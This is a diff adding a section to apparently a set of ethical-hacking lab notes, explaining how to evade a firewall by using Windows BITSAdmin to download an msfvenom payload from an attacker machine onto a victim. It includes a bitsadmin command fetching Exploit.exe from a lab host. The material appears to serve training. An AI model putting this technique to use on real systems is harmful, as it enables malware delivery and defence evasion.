@@ -1618,3 +1618,19 @@ ip and random password and perform some cmd fn there like ls cd pwd whoami etc
 again switch back to ubuntu and 
 tail cowrie.log
 ```
+</details>
+<details>
+<summary>Evade Firewall through Windows BITSAdmin</summary>
+
+* Background Intelligent transfer service
+```console
+:~$ create a payload with help of msfvenom
+here we are using BITSAdmin to transfer this file 
+for this generate the payload in parrot machine
+and go to victim machine
+and open windows powershell
+bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe
+and payload loaded to self
+```
+</details>
+
